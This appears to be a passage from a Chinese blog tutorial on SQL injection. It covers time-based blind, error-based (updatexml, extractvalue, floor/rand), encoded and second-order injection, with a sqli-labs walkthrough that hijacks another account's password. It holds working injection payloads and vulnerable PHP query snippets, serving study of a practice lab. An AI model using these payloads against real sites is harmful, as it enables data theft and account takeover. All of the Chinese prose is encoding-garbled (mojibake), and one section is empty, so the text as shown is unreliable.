<p>è¯­æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep(x)</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼šå»¶è¿Ÿxç§’ã€‚</p>
<p>ä¸€èˆ¬ä¸ifé…åˆä½¿ç”¨ï¼Œ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition, sleep(3),sleep(5))</span><br></pre></td></tr></table></figure></p>
<p>conditionå¯ä»¥ä¸ºå¸ƒå°”ç›²æ³¨ä¸­çš„payloadï¼Œå¦‚æœpayloadä¸ºçœŸï¼Œé‚£ä¹ˆå°±ä¼šå»¶è¿Ÿ3ç§’ä¹‹åè¿”å›é¡µé¢ï¼Œå¦åˆ™ï¼Œå»¶è¿Ÿ5ç§’ä¹‹åè¿”å›é¡µé¢ã€‚è¿™æ ·å­ï¼Œå°±å¯ä»¥æ ¹æ®æ•°æ®åŒ…çš„è¿”å›æ—¶é—´åˆ¤æ–­è¾“å…¥çš„payloadæ­£ç¡®ä¸å¦ã€‚</p>
<h3 id="è¿‡ç¨‹">2.5.2. è¿‡ç¨‹</h3>
<p>è¿‡ç¨‹å’Œå¸ƒå°”ç›²æ³¨ä¸€æ ·ï¼Œè¿™é‡Œç®€å•è¯´æ˜ä¸€ä¸‹å¸¸è§„çš„payloadå³å¯ã€‚</p>
<ol type="1">
<li>åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼› <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if((length(database())=8),sleep(5),1)--+</span><br></pre></td></tr></table></figure></li>
<li>çˆ†æ•°æ®åº“åï¼› <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr(database(),1,1))=115),sleep(5),1)--+</span><br></pre></td></tr></table></figure></li>
<li>çˆ†å¯¹åº”æ•°æ®åº“ä¸‹çš„group_concat(table_name)çš„é•¿åº¦ï¼›</li>
<li>çˆ†å¯¹åº”æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨åï¼›</li>
<li>çˆ†å¯¹åº”è¡¨ä¸‹çš„group_concat(column_name)çš„é•¿åº¦ï¼›</li>
<li>çˆ†å¯¹åº”è¡¨ä¸‹çš„æ‰€æœ‰å­—æ®µå</li>
<li>çˆ†å¯¹åº”å­—æ®µçš„group_concat(columnName)çš„é•¿åº¦ï¼›</li>
<li>çˆ†å¯¹åº”å­—æ®µçš„ä¿¡æ¯ï¼›</li>
</ol>
<p>è¿™é‡Œåªæ¼”ç¤ºäº†å‰ä¸¤ä¸ªï¼Œå…¶ä»–ä¹Ÿç±»ä¼¼ï¼Œç›´æ¥å°†å¸ƒå°”ç›²æ³¨ä¸­çš„oråé¢çš„payloadä½œä¸ºifçš„æ¡ä»¶è¯­å¥å³å¯ã€‚</p>
<p>è§£é‡Šï¼š<code>?id=1' and if((length(database())=8),sleep(5),1)--+</code>ï¼Œå¦‚æœifä¸­çš„æ¡ä»¶è¯­å¥ä¸ºçœŸï¼Œé‚£ä¹ˆæ­¤æ—¶è¯­å¥å°±ä¼šå˜æˆ<code>?id=1' and sleep(5)--+</code>å› ä¸ºå‰é¢æ˜¯1ï¼Œæ˜¯çœŸçš„ï¼Œä»è€Œæ‰§è¡Œåé¢çš„è¯­å¥ï¼Œä¹Ÿå°±æ˜¯å»¶è¿Ÿ5ç§’ã€‚å¦‚æœifä¸­çš„æ¡ä»¶ä¸ºå‡ï¼Œæ­¤æ—¶è¯­å¥ä¸º<code>?id=1' and 1--+</code>å‰åéƒ½ä¸ºçœŸï¼Œç›´æ¥è¿”å›ç»“æœï¼Œä¸ä¼šæœ‰ä»»ä½•å»¶è¿Ÿã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424102801.png" /></p>
<p>éœ€è¦æ³¨æ„ï¼š 1. æ—¶é—´ç›²æ³¨ä¸­è¦ä½¿ç”¨andï¼Œæˆ‘æµ‹è¯•orçš„ä¸è¡Œã€‚ 2. ä½¿ç”¨andè¦æ³¨æ„idé‚£é‡Œå°±éœ€è¦ä¸€ä¸ªæ•°æ®åº“ä¸­å­˜åœ¨çš„idï¼Œå› ä¸º<code>condition1 and condition2</code>ä¸­å¦‚æœå‰è€…ä¸ºfalseï¼Œé‚£ä¹ˆåè€…å°±ä¸ä¼šè¢«åˆ¤æ–­ï¼Œå› ä¸ºæ— è®ºåè€…æ˜¯ä»€ä¹ˆï¼Œæ•´ä¸ªä¸–å­çš„ç»“æœéƒ½æ˜¯falseã€‚</p>
<h2 id="æŠ¥é”™æ³¨å…¥">2.6. æŠ¥é”™æ³¨å…¥</h2>
<p><strong>åŸç†ï¼šä¸»è¦æ˜¯åˆ©ç”¨æŸäº›å‡½æ•°ï¼Œå½“è¿™äº›å‡½æ•°çš„æŸä¸ªå‚æ•°é”™è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥å‡ºå¯¹åº”çš„é”™è¯¯ä¿¡æ¯ã€‚</strong></p>
<p>æŠ¥é”™æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶æ˜¯ï¼šæœåŠ¡å™¨å¼€å¯æŠ¥é”™ä¿¡æ¯è¿”å›ï¼Œä¹Ÿå°±æ˜¯å‘ç”Ÿé”™è¯¯æ—¶è¿”å›æŠ¥é”™ä¿¡æ¯ã€‚</p>
<p>å¸¸è§çš„æœ‰å››ç§ï¼š</p>
<ul>
<li>exp</li>
<li>updatexml, extractvalue</li>
<li>floor+rand</li>
</ul>
<p>æ­¥éª¤ä¸å¸ƒå°”ç›²æ³¨ç±»ä¼¼ï¼Œåªä¸è¿‡å› ä¸ºè¿™é‡Œé€šè¿‡æŠ¥é”™å›æ˜¾ï¼Œæ‰€ä»¥ä¸éœ€è¦å»è®¡ç®—é•¿åº¦çš„ä¿¡æ¯ã€‚</p>
<h3 id="exp">2.6.1. exp()</h3>
<p><strong>ä½œç”¨ï¼šè¯¥å‡½æ•°è®¡ç®—ä»¥eä¸ºåº•çš„æŒ‡æ•°å‡½æ•°çš„å€¼ï¼Œåœ¨MySQLä¸­ï¼Œå½“å‚æ•°å¤§äº709æ—¶å°±ä¼šæŠ¥é”™</strong></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424195335.png" /></p>
<p>å› æ­¤ï¼Œä¸€èˆ¬çš„åˆ©ç”¨æ–¹å¼å°±æ˜¯ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exp(709+condition)</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœconditionä¸ºçœŸï¼Œé‚£ä¹ˆæ­¤æ—¶çš„å¼å­ä¸ºexp(710)å› æ­¤ä¼šæŠ¥é”™ï¼›åä¹‹ï¼Œå¦‚æœconditionä¸ºå‡ï¼Œéš¾ä¹ˆæ­¤æ—¶exp(709)å¹¶ä¸ä¼šæŠ¥é”™ã€‚</p>
<p>ä¸exp()ç±»ä¼¼çš„è¿˜æœ‰cot()å’Œpow()ã€‚å…¶ä¸­cotä¸ºä¸‰è§’å‡½æ•°ï¼Œå¦‚æœå‚æ•°ä¸º0åˆ™ä¼šæŠ¥é”™ï¼›pow()ä¸ºæŒ‡æ•°å‡½æ•°ï¼Œpow(a,b)å°±æ˜¯æ±‚açš„bæ¬¡æ–¹ï¼Œpow()å½“å‚æ•°è¿‡å¤§æ—¶ä¹Ÿä¼šæŠ¥é”™ï¼Œå› æ­¤ä¸¤è€…çš„åˆ©ç”¨æ–¹å¼å¯ä»¥ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cot(condition)</span><br><span class="line">	condition=1 -&gt; cot(1)</span><br><span class="line">	condition=0 -&gt; cot(0)</span><br><span class="line"></span><br><span class="line">pow(condition,9999)</span><br><span class="line">	condition=1 -&gt; pow(1,9999)=1</span><br><span class="line">	condition=0 -&gt; pow(0,9999)=0</span><br></pre></td></tr></table></figure></p>
<p>é«˜ç‰ˆæœ¬MySQLå·²ç»ä¿®å¤è¯¥æ¼æ´</p>
<h3 id="updatexml-extractvalue">2.6.2. updatexml(), extractvalue()</h3>
<p>åœ¨mysqlé«˜ç‰ˆæœ¬ï¼ˆå¤§äº5.1ç‰ˆæœ¬ï¼‰ä¸­æ·»åŠ äº†å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ï¼šupdatexml(), extractvalue()ï¼Œå½“ä¸¤ä¸ªæ–‡æ¡£æ‰§è¡Œæ—¶ï¼Œå¦‚æœå‡ºç°xmlæ–‡æ¡£è·¯å¾„é”™è¯¯å°±ä¼šäº§ç”ŸæŠ¥é”™ã€‚</p>
<h4 id="updatexml">2.6.2.1. updatexml()</h4>
<p>è¯­æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(XML_document, XPath_string, new_value)</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼šå½“XPathå‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œåˆ™ä¼šçˆ†å‡ºé”™è¯¯ä¿¡æ¯ã€‚</p>
<p>ä½¿ç”¨ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,database()),0) # å…¶ä»–ä¸¤ä¸ªå‚æ•°éšä¾¿å¡«ï¼Œ0x7eè¡¨ç¤ºçš„æ˜¯~</span><br></pre></td></tr></table></figure></p>
<p>æœ€åå°±ä¼šå°†concat(0x7e,database())ç»™çˆ†å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯~databaseNameã€‚</p>
<h4 id="extractvalue">2.6.2.2. extractvalue()</h4>
<p>è¯­æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(XML_document, XPath_string)</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼šå½“XPathå‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œåˆ™ä¼šçˆ†å‡ºé”™è¯¯ä¿¡æ¯ã€‚</p>
<p>ä½¿ç”¨ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,database()))</span><br></pre></td></tr></table></figure></p>
<p>æœ€åå°±ä¼šå°†concat(0x7e,database())ç»™çˆ†å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯~databaseNameã€‚</p>
<h3 id="floor-rand">2.6.3. floor(), rand()</h3>
<h4 id="floor">2.6.3.1. floor()</h4>
<p>floor(): å‘ä¸‹å–æ•´</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424200853.png" /></p>
<h4 id="rand">2.6.3.2. rand()</h4>
<p>rand(): äº§ç”Ÿ<code>[0,1)</code> çš„éšæœºæ•°ã€‚æœ‰ä¸¤ç§å½¢å¼</p>
<ul>
<li>rand(): æ— å‚æ•°ï¼Œæ­¤æ—¶äº§ç”Ÿçš„éšæœºæ•°æ˜¯éšæœºçš„ï¼Œä¸å¯é‡å¤çš„ï¼›</li>
<li>rand(x): æœ‰å‚æ•°ï¼Œç›¸å½“äºæŒ‡å®šéšæœºæ•°ç”Ÿäº§çš„ç§å­ï¼Œé‚£ä¹ˆè¿™ç§æƒ…å†µäº§ç”Ÿçš„éšæœºæ•°æ˜¯å¯é‡å¤çš„ï¼›</li>
</ul>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424201435.png" /></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå¸¦å…¥ç›¸åŒå‚æ•°çš„å¾—åˆ°çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œè€Œæ²¡å¸¦å…¥å‚æ•°çš„å€¼æ˜¯ä¸ä¸€æ ·çš„ã€‚å› æ­¤ï¼Œåªè¦å¸¦å…¥ä¸€æ ·çš„å‚æ•°ï¼Œé‚£ä¹ˆè¿”å›çš„å€¼å°±æ˜¯ç›¸åŒçš„ï¼</p>
<h4 id="ä¸¤è€…é…åˆ">2.6.3.3. ä¸¤è€…é…åˆ</h4>
<p>å¸¸ç”¨çš„è¯­å¥ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*), concat((select version()), floor(rand()*2))as a from information_schema.tables group by a;</span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">select count(*), concat((select version()), floor(rand()*2))a from information_schema.tables group by a;</span><br></pre></td></tr></table></figure></p>
<p>å› ä¸ºrand()çš„å€¼ä¸º<code>[0,1)</code>ï¼Œé‚£ä¹ˆ<code>rand()*2=[0,2)</code>ï¼Œå› æ­¤<code>floor(rand()*2)=0 or 1</code>ã€‚</p>
<p>ï¼ˆéœ€è¦ä¸€å®šçš„è¿æ°”ï¼‰è¿™é‡Œå°±éœ€è¦ç”¨åˆ°group byçš„ç‰¹æ€§[[#group by]]ã€‚å½“group_concatå’Œrandä¸€èµ·ä½¿ç”¨æ—¶ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>å…ˆè®¡ç®—<code>group by a</code>ï¼Œå‡è®¾æ­¤æ—¶<code>group by databaseName1</code>ï¼Œè¡¨ä¸­æ²¡æœ‰è¯¥ä¸»é”®ï¼Œå› æ­¤ä¼šå°†è¯¥ä¸»é”®æ’å…¥ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œåœ¨æ’å…¥ä¹‹å‰ä¼šå†æ¬¡è®¡ç®—ä¸€ä¸‹rand()ï¼Œå‡è®¾å†æ¬¡è®¡ç®—ä¸ºdatabaseName0ï¼Œé‚£ä¹ˆçœŸæ­£æ’å…¥è¡¨ä¸­çš„ä¸»é”®å°±æ˜¯databaseName0ï¼›</li>
<li>å–ç¬¬äºŒæ¡æ¶ˆæ¯æ—¶ï¼Œå‡è®¾ç¬¬ä¸€æ¬¡è®¡ç®—å‡ºçš„ä¸ºdatabaseName1ï¼Œåˆ¤æ–­è¡¨ä¸­æ²¡æœ‰è¯¥ä¸»é”®ï¼Œå‡†å¤‡æ’å…¥ï¼Œåœ¨æ’å…¥ä¹‹å‰å†æ¬¡è®¡ç®—ï¼Œæ­¤æ—¶å¾—databaseName0ï¼Œä¹Ÿå°±æ˜¯æ’å…¥çš„ä¸»é”®ä¸ºdatabaseName0ï¼Œä½†æ˜¯è¯¥ä¸»é”®å·²ç»å­˜åœ¨äº†ï¼Œæ‰€ä»¥å°±æŠ¥é”™äº†ã€‚</li>
</ol>
<p>æ³¨æ„ï¼š</p>
<ol type="1">
<li>æˆ‘è¿™é‡Œåªæ˜¯å‡è®¾è®¡ç®—ä¸¤æ¬¡ï¼Œå®é™…è®¡ç®—å¤šå°‘æ¬¡å¹¶ä¸çŸ¥é“ï¼Œä½†ä¸€å®š&gt;=2æ¬¡ï¼›</li>
<li>è¿æ°”ä¸å¥½å¯èƒ½å¹¶ä¸ä¼šå‡ºç°è¿™æ ·çš„æƒ…å†µï¼Œéœ€è¦å¤šè¯•å‡ æ¬¡</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424205332.png" /></p>
<p>çœ‹ï¼Œç¬¬ä¸€æ¬¡å°±æ²¡è§¦å‘ã€‚</p>
<h1 id="éå¸¸è§„æ³¨å…¥æ–¹æ³•">3. éå¸¸è§„æ³¨å…¥æ–¹æ³•</h1>
<h2 id="åŠ è§£å¯†æ³¨å…¥">3.1. åŠ è§£å¯†æ³¨å…¥</h2>
<p>è¿™ä¸ªæ¯”è¾ƒç®€å•ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå‚æ•°éƒ½æ˜¯æ˜æ–‡ä¼ é€’çš„ï¼Œæ¯”å¦‚è¯´ï¼š<code>?id=1</code>ï¼Œå½“ç„¶ï¼Œä¹Ÿæœ‰æ—¶å€™å‚æ•°è¿›è¡Œäº†ç®€å•çš„åŠ å¯†ï¼Œæ¯”å¦‚base64ç¼–ç ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¸º<code>?id=MQ==</code>ï¼Œåˆ°äº†æœåŠ¡å™¨ååœ¨è¿›è¡Œè§£ç ã€‚è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬æ‰€æœ‰çš„payloadéƒ½éœ€è¦å…ˆæŒ‰ç…§æœåŠ¡å™¨çš„åŠ å¯†å½“æ—¶åŠ å¯†ï¼Œç„¶åå†ä¼ å…¥ã€‚</p>
<h2 id="dnslogæ³¨å…¥">3.2. DNSlogæ³¨å…¥</h2>
<h2 id="äºŒæ¬¡æ³¨å…¥">3.3. äºŒæ¬¡æ³¨å…¥</h2>
<p>åŸç†ï¼šäºŒæ¬¡æ³¨å…¥æ˜¯å­˜å‚¨å‹æ³¨å…¥ï¼Œå¯ä»¥ç†è§£ä¸ºæ„é€ æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œæ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°äº†SQLæŸ¥è¯¢è¯­å¥æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸå¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚è¯¦ç»†ç‚¹æ¥è®²ï¼Œå°±æ˜¯åœ¨ç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…åªæ˜¯ä½¿ç”¨äº† addslashes æˆ–è€…æ˜¯å€ŸåŠ© get_magic_quotes_gpc å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®æœ¬èº«è¿˜æ˜¯è„æ•°æ®ã€‚åœ¨å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡è¿›è¡Œéœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºäº†è„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆSQLçš„äºŒæ¬¡æ³¨å…¥ã€‚æ¯”å¦‚åœ¨ç¬¬ä¸€æ¬¡æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œæ•°æ®ä¸­å¸¦æœ‰å•å¼•å·ï¼Œç›´æ¥æ’å…¥åˆ°äº†æ•°æ®åº“ä¸­ï¼›ç„¶ååœ¨ä¸‹ä¸€æ¬¡ä½¿ç”¨ä¸­åœ¨æ‹¼å‡‘çš„è¿‡ç¨‹ä¸­ï¼Œå°±å½¢æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚äºŒæ¬¡æ³¨å…¥æ— æ³•é€šè¿‡æ‰«æå·¥å…·æˆ–è€…ä»£ç è‡ªå·±æ‰‹å·¥æµ‹è¯•å‡ºæ¥çš„ï¼ŒäºŒæ¬¡æ³¨å…¥ä¸€èˆ¬ä¼šäº§ç”Ÿåœ¨ç½‘ç«™ç¨‹åºæºä»£ç æ‰ä¼šå‘ç°çš„æ³¨å…¥æ¼æ´ï¼Œä»å‰ç«¯æˆ–è€…é»‘ç›’æµ‹è¯•æ˜¯çœ‹ä¸åˆ°è¿™ä¸ªæ¼æ´çš„ã€‚</p>
<p>åŸç†å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424213751.png" /></p>
<p>è¿‡ç¨‹ï¼š</p>
<ol type="1">
<li>æ’å…¥æ¶æ„æ•°æ®ï¼šç¬¬ä¸€æ¬¡è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®çš„æ—¶å€™ï¼Œä»…ä»…å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™è¿˜æ˜¯ä¿ç•™äº†åŸæ¥çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®æœ¬èº«åŒ…å«æ¶æ„å†…å®¹</li>
<li>å¼•ç”¨æ¶æ„æ•°æ®ï¼šåœ¨å°†æ•°æ®å­˜å…¥åˆ°äº†æ•°æ®åº“ä¸­ä¹‹åï¼Œå¼€å‘è€…å°±è®¤ä¸ºæ•°æ®æ˜¯å¯ä¿¡çš„ã€‚åœ¨ä¸‹ä¸€æ¬¡éœ€è¦è¿›è¡ŒæŸ¥è¯¢çš„æ—¶å€™ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºäº†æ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒå’Œå¤„ç†ï¼Œè¿™æ ·å°±ä¼šé€ æˆSQLçš„äºŒæ¬¡æ³¨å…¥ã€‚</li>
</ol>
<p>æ€è·¯ï¼š</p>
<ol type="1">
<li>é€šè¿‡æ„é€ æ•°æ®çš„å½¢å¼ï¼Œåœ¨æµè§ˆå™¨æˆ–è€…å…¶ä»–è½¯ä»¶ä¸­æäº¤HTTPæ•°æ®æŠ¥æ–‡è¯·æ±‚åˆ°æœåŠ¡ç«¯è¿›è¡Œå¤„ç†ï¼Œæäº¤çš„æ•°æ®æŠ¥æ–‡è¯·æ±‚ä¸­å¯èƒ½åŒ…å«äº†é»‘å®¢æ„é€ çš„SQLè¯­å¥æˆ–è€…å‘½ä»¤ï¼›</li>
<li>æœåŠ¡ç«¯åº”ç”¨ç¨‹åºä¼šå°†é»‘å®¢æäº¤çš„æ•°æ®ä¿¡æ¯è¿›è¡Œå­˜å‚¨ï¼Œé€šå¸¸æ˜¯ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œä¿å­˜çš„æ•°æ®ä¿¡æ¯çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºåº”ç”¨ç¨‹åºæ‰§è¡Œå…¶ä»–åŠŸèƒ½æä¾›åŸå§‹è¾“å…¥æ•°æ®å¹¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚åšå‡ºå“åº”ï¼›</li>
<li>å‘æœåŠ¡ç«¯å‘é€ç¬¬äºŒä¸ªä¸ç¬¬ä¸€æ¬¡ä¸ç›¸åŒçš„è¯·æ±‚æ•°æ®ä¿¡æ¯ï¼›</li>
<li>æœåŠ¡ç«¯æ¥æ”¶åˆ°é»‘å®¢æäº¤çš„ç¬¬äºŒä¸ªè¯·æ±‚ä¿¡æ¯åï¼Œä¸ºäº†å¤„ç†è¯¥è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ä¼šæŸ¥è¯¢æ•°æ®åº“ä¸­å·²ç»å­˜å‚¨çš„æ•°æ®ä¿¡æ¯å¹¶å¤„ç†ï¼Œä»è€Œå¯¼è‡´é»‘å®¢åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­æ„é€ çš„SQLè¯­å¥æˆ–è€…å‘½ä»¤åœ¨æœåŠ¡ç«¯ç¯å¢ƒä¸­æ‰§è¡Œï¼›</li>
<li>æœåŠ¡ç«¯è¿”å›æ‰§è¡Œçš„å¤„ç†ç»“æœæ•°æ®ä¿¡æ¯ï¼Œé»‘å®¢å¯ä»¥é€šè¿‡è¿”å›çš„ç»“æœæ•°æ®ä¿¡æ¯åˆ¤æ–­äºŒæ¬¡æ³¨å…¥æ¼æ´åˆ©ç”¨æ˜¯å¦æˆåŠŸï¼›</li>
</ol>
<p>é¢˜ç›®ï¼š[[Sqlilabs-less-24]]</p>
<p>æ‰“å¼€ç½‘é¡µçœ‹åˆ°ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œè¾“å…¥admin/adminåæ˜¯ä¿®æ”¹å¯†ç çš„ç•Œé¢ã€‚æ”¹å¯†ç æ¶‰åŠåˆ°å¯¹æ•°æ®åº“çš„è®°å½•è¿›è¡Œæ›¿æ¢ï¼Œæˆ‘ä»¬æ€€ç–‘æ­¤å¤„æœ‰ä¸€ä¸ª UPDATE è¯­å¥ã€‚</p>
<p>åœ¨ä»»ä½•ç•Œé¢è¿›è¡Œæ³¨å…¥åº”è¯¥éƒ½æ˜¯æ— æ•ˆçš„ï¼Œå› ä¸ºæ“ä½œå¤±è´¥æ—¶ä¼šè·³è½¬åˆ°å…¶ä»–é¡µé¢ï¼Œè€Œæ²¡æœ‰ä»»ä½•ä¾‹å¦‚é”™è¯¯çš„å›æ˜¾ä¿¡æ¯ã€‚æ­¤å¤„è€ƒè™‘çš„å°±ä¸æ˜¯ä¹‹å‰é‚£äº›æŠŠæ•æ„Ÿä¿¡æ¯å¼„å‡ºæ¥çš„æ³¨å…¥äº†ï¼Œè€Œæ˜¯è€ƒè™‘åˆ©ç”¨æ”¹å¯†ç æ“ä½œå¤ºå–å…¶ä»–è´¦å·çš„æ§åˆ¶æƒï¼Œæ­¤å¤„æˆ‘ä»¬è€ƒè™‘äºŒæ¬¡æ³¨å…¥ã€‚</p>
<ol type="1">
<li>é¦–å…ˆæˆ‘ä»¬æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„ç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·çš„ç”¨æˆ·åä¸º â€œbatman'#â€ï¼Œå¯†ç éšä¾¿è®¾ã€‚</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424214307.png" /></p>
<ol start="2" type="1">
<li>ç™»å½•åˆšåˆšæ³¨å†Œçš„ç”¨æˆ·ï¼Œæ³¨æ„ï¼Œæ­¤æ—¶çš„ç”¨æˆ·åè¿˜æ˜¯ batman'#</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424214458.png" /></p>
<ol start="3" type="1">
<li>ä¿®æ”¹å¯†ç ä¸º999999ï¼Œç„¶åæŸ¥çœ‹æ•°æ®åº“ä¸­çš„ä¿¡æ¯ï¼Œå‘ç°batmançš„å¯†ç è¢«ä¿®æ”¹äº†ï¼Œè€Œbatman'#çš„æ²¡æœ‰è¢«ä¿®æ”¹</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424214548.png" /></p>
<p>æˆ‘ä»¬æŸ¥çœ‹æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update users set password=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></p>
<p>è€Œæˆ‘ä»¬ä¿®æ”¹å¯†ç çš„æ“ä½œä¼ å…¥çš„å‚æ•°ä¸º: ?username=batman'#&amp;pass=999999ï¼Œæ­¤æ—¶çš„åå°è¯­å¥å˜ä¸ºï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update users set password=&#x27;999999&#x27; where username=&#x27;batman&#x27;#&#x27; and password=&#x27;123456&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></p>
<p><code>#</code>åé¢çš„è¯­å¥éƒ½è¢«æ³¨é‡Šï¼ŒçœŸæ­£å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢çš„è¯­å¥ä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update users <span class="keyword">set</span> password<span class="operator">=</span><span class="string">&#x27;999999&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;batman&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>å› æ­¤ä¿®æ”¹äº†batmanç”¨æˆ·çš„å¯†ç ã€‚</p>
<h2 id="äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥">3.4. äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥</h2>
<h3 id="åŸç†">3.4.1. åŸç†</h3>
<p>å‡è®¾åå°è¿›è¡Œäº†ä¸¤æ¬¡æ•°æ®åº“æŸ¥è¯¢ï¼Œè¯­å¥åˆ†åˆ«ä¸ºï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$res1</span> = <span class="string">&quot;select * from baseinfo where id = <span class="subst">$id</span> limit 0,1&quot;</span>; <span class="comment"># $id ä¸ºç”¨æˆ·è¾“å…¥</span></span><br><span class="line"><span class="variable">$res2</span> = <span class="string">&quot;select * from users where username = &#x27;.<span class="subst">$res</span>[1].&#x27; limit 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res2</span>; <span class="comment"># çå†™çš„è¿™å¥</span></span><br></pre></td></tr></table></figure></p>
